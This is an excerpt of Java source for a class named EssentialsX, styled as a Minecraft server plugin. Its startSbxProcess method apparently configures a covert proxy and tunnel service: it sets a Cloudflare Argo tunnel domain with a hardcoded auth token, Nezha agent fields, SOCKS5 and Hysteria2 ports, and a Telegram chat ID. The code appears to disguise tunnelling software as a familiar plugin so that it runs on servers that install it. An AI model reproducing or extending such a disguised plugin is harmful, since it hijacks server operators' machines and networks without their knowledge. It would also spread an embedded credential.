...
public class EssentialsX extends JavaPlugin {
    ...
    private void startSbxProcess() throws Exception {
        ...
        env.put("UUID", "e6d978d8-a06b-4b5d-ad6b-5dc005a2a766");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "xserver.czcxz1.ggff.net");
        env.put("ARGO_AUTH", "eyJhIjoiNGEwZDZlNzY4YTUyNGM0NzVmOTUwMjc3YTEwOTBiYjUiLCJ0IjoiMDdlMjQwYTUtZmVjZC00NjRjLTk2NTQtNDVkMDM2OWRlZmQ1IiwicyI6Ik1XSTVZak0xTmpndFlXWXhNQzAwTW1WakxXSTVNakV0TkRWbU9XVTVObVUzTXpreCJ9");
        env.put("S5_PORT", "19132");
        env.put("HY2_PORT", "19132");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "729082452");
        env.put("BOT_TOKEN", "");
